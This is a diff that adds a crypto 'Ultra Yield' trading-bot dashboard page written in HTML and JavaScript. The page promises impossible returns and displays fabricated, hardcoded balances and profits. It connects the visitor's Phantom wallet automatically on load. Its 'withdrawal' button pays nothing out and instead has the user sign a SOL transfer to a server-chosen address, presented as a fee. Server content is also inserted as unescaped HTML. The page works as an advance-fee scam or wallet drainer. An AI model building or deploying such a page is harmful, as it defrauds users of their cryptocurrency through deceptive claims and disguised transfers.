@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TrueBotAI Ultra Yield Dashboard</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto&display=swap');
+    * { box-sizing: border-box; }
+    body { margin:0; font-family:'Roboto', sans-serif; background:#0a0f1a; color:#cbd5e1; }
+    header { background:#111827; padding:1rem 2rem; text-align:center; border-bottom:2px solid #f59e0b; }
+    header h1 { font-family:'Orbitron', sans-serif; font-weight:500; font-size:1.8rem; letter-spacing:2px; margin:0; color:#fbbf24; }
+    header .fee-notice { font-size:0.9rem; color:#fbbf24; margin-top:0.3rem; }
+    button.connect-wallet { background:#f59e0b; border:none; padding:.6rem 1.3rem; border-radius:25px; color:#0a0f1a; font-weight:600; cursor:pointer; margin-top:1rem; }
+    button.connect-wallet:hover { background:#d97706; }
+    nav { margin-top:1rem; display:flex; justify-content:center; gap:2rem; flex-wrap:wrap; }
+    nav button { background:transparent; border:none; font-family:'Orbitron'; font-size:1rem; color:#fbbf24; cursor:pointer; padding:.5rem 1rem; border-radius:12px; transition:0.3s; min-width:110px; text-align:center; }
+    nav button.active, nav button:hover { background:#f59e0b; color:#0a0f1a; box-shadow:0 0 8px #f59e0b; }
+    main { max-width:960px; margin:2rem auto; padding:0 1rem; }
+    .section { background:#1e293b; border-radius:12px; padding:2rem; margin-bottom:2rem; box-shadow:0 0 20px #11182788; }
+    h2 { font-family:'Orbitron'; color:#fbbf24; margin-top:0; margin-bottom:1rem; letter-spacing:1.5px; }
+    .card-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:1.5rem; }
+    .card { background:#111827; border-radius:10px; padding:1.2rem; box-shadow: inset 0 0 8px #f59e0baa; display:flex; flex-direction:column; min-height:320px; color:#fcd34d; }
+    .card h3 { margin:0 0 .6rem 0; font-family:'Orbitron'; color:#fbbf24; }
+    .card p { flex-grow:1; font-size:0.9rem; color:#fde68acc; margin-bottom:1rem; }
+    .earnings span { display:block; font-weight:600; }
+    .min-invest { font-size:.95rem; font-weight:700; color:#fbbf24; margin-bottom:1rem; }
+    .card button { background:#f59e0b; border:none; padding:.6rem 1rem; border-radius:20px; font-family:'Orbitron'; font-weight:700; color:#0a0f1a; cursor:pointer; }
+    .card button:hover { background:#d97706; }
+    footer { text-align:center; color:#fbbf24; font-size:0.9rem; padding:1.5rem 0; border-top:1px solid #f59e0b; }
+    .modal { display:none; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.8); justify-content:center; align-items:center; }
+    .modal-content { background-color:#1e293b; margin:auto; padding:2rem; border:1px solid #f59e0b; border-radius:12px; width:80%; max-width:500px; text-align:center; position:relative; }
+    .close-button { color:#aaa; position:absolute; top:10px; right:20px; font-size:28px; font-weight:bold; cursor:pointer; }
+    .close-button:hover { color:white; }
+    .address-box { background:#111827; padding:.8rem; border-radius:8px; margin-top:1rem; word-break:break-all; }
+    .content-container { display:none; }
+  </style>
+</head>
+<body>
+<header>
+  <h1>TrueBotAI Ultra Yield</h1>
+  <div class="fee-notice">Performance Fee: <strong>20% of net profits</strong></div>
+  <button class="connect-wallet">Connect Wallet</button>
+</header>
+
+<nav>
+  <button class="active" data-section="trading">Ultra Trading Bots</button>
+  <button data-section="sniping">Extreme Sniping</button>
+  <button data-section="staking">Yield Farming</button>
+  <button data-section="mining">Quantum Mining</button>
+  <button data-section="portfolio">Portfolio Overview</button>
+</nav>
+
+<main>
+  <section id="trading" class="section">
+    <h2>Ultra Trading Bots</h2>
+    <div class="card-grid">
+      <div class="card" data-cid="QmSaBDZL6DmHQRfnZv7JhouSrrpRGPs7kmpVKc38sk1Nm9">
+        <h3>Leverage Trading Bot</h3>
+        <p>Utilizes margin and algorithmic trading for ultra-high returns. Suitable only for experienced investors.</p>
+        <div class="earnings">
+          <span>Daily: 4.0 SOL (~$120)</span>
+          <span>Monthly: 120 SOL (~$3,600)</span>
+          <span>Yearly: 1440 SOL (~$43,200)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 300 SOL (~$9,000)</div>
+        <button class="activate-btn">Activate</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Additional sections hidden by default -->
+  <section id="sniping" class="section" style="display:none;"><h2>Extreme Sniping</h2></section>
+  <section id="staking" class="section" style="display:none;"><h2>Yield Farming</h2></section>
+  <section id="mining" class="section" style="display:none;"><h2>Quantum Mining</h2></section>
+  <section id="portfolio" class="section" style="display:none;">
+    <h2>Portfolio Overview</h2>
+    <div class="stat-item"><h3>Current Balance:</h3><span id="currentBalance">200.00 SOL</span></div>
+    <div class="stat-item"><h3>Total Profits:</h3><span id="totalProfits">50.00 SOL</span></div>
+    <button id="withdrawalBtn">Initiate Withdrawal</button>
+  </section>
+</main>
+
+<footer>
+  Performance Fee: <strong>20% of net profits</strong> — No upfront or hidden fees.
+</footer>
+
+<div id="paymentModal" class="modal">
+  <div class="modal-content">
+    <span class="close-button">&times;</span>
+    <h3 id="modalTitle"></h3>
+    <div id="modalBody"></div>
+  </div>
+</div>
+
+<script src="https://unpkg.com/@solana/web3.js@1.78.5/lib/index.iife.js"></script>
+<script>
+const paymentModal = document.getElementById('paymentModal');
+const modalTitle = document.getElementById('modalTitle');
+const modalBody = document.getElementById('modalBody');
+const closeButton = document.querySelector('.close-button');
+const connectButton = document.querySelector('.connect-wallet');
+const withdrawalBtn = document.getElementById('withdrawalBtn');
+
+let userWallet = null;
+
+// Modal handlers
+closeButton.onclick = () => paymentModal.style.display = 'none';
+window.onclick = (event) => { if(event.target==paymentModal) paymentModal.style.display='none'; };
+const showModal = (title, message) => { modalTitle.textContent = title; modalBody.innerHTML = message; paymentModal.style.display='flex'; };
+
+// Wallet connection
+const connectWallet = async () => {
+  try {
+    if(window.solana && window.solana.isPhantom){
+      const resp = await window.solana.connect();
+      userWallet = resp.publicKey;
+      connectButton.textContent='Wallet Connected';
+    } else showModal('Wallet Not Found','<p>Phantom wallet not found. Install it to continue.</p>');
+  } catch(e){ showModal('Connection Error', '<p>Failed to connect wallet.</p>'); }
+};
+window.addEventListener('load', connectWallet);
+connectButton.addEventListener('click', connectWallet);
+
+// Navigation
+document.querySelectorAll('nav button').forEach(btn=>{
+  btn.addEventListener('click', ()=>{
+    document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    const target=btn.getAttribute('data-section');
+    document.querySelectorAll('main section').forEach(sec=>sec.style.display=(sec.id===target)?'block':'none');
+  });
+});
+
+// Withdrawal
+withdrawalBtn.addEventListener('click', async ()=>{
+  if(!userWallet){ showModal('Wallet Not Connected','<p>Connect your Phantom wallet first.</p>'); return; }
+  const profit=parseFloat(document.getElementById('totalProfits').textContent);
+  if(isNaN(profit)||profit<=0){ showModal('No Profits','<p>No profits to withdraw.</p>'); return; }
+
+  showModal('Processing Withdrawal','<p>Calculating fee...</p>');
+  try {
+    const resp=await fetch('/api/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userProfit:profit})});
+    if(!resp.ok)throw new Error('Failed to get withdrawal details.');
+    const data=await resp.json();
+    const dest=new window.solanaWeb3.PublicKey(data.address);
+    const lamports=data.feeAmount*window.solanaWeb3.LAMPORTS_PER_SOL;
+    const tx=new window.solanaWeb3.Transaction().add(window.solanaWeb3.SystemProgram.transfer({fromPubkey:userWallet,toPubkey:dest,lamports}));
+    const {signature}=await window.solana.signAndSendTransaction(tx);
+    showModal('Transaction Submitted!',`<p>Transaction signature:</p><div class="address-box">${signature}</div>`);
+  } catch(e){ showModal('Transaction Failed',`<p>${e.message}</p>`); }
+});
+
+// IPFS content fetching
+document.querySelectorAll('.activate-btn').forEach(btn=>{
+  btn.addEventListener('click', async e=>{
+    const card=e.target.closest('.card');
+    const cid=card.getAttribute('data-cid');
+    showModal('Loading Content',`<p>Fetching data for CID: ${cid}</p>`);
+    try{
+      const resp=await fetch(`/api/ipfs/${cid}`);
+      if(!resp.ok)throw new Error('Network response was not ok');
+      const text=await resp.text();
+      showModal('Content Loaded',text);
+    }catch(err){ showModal('Content Error',err.message); }
+  });
+});
+</script>
+</body>
+</html>
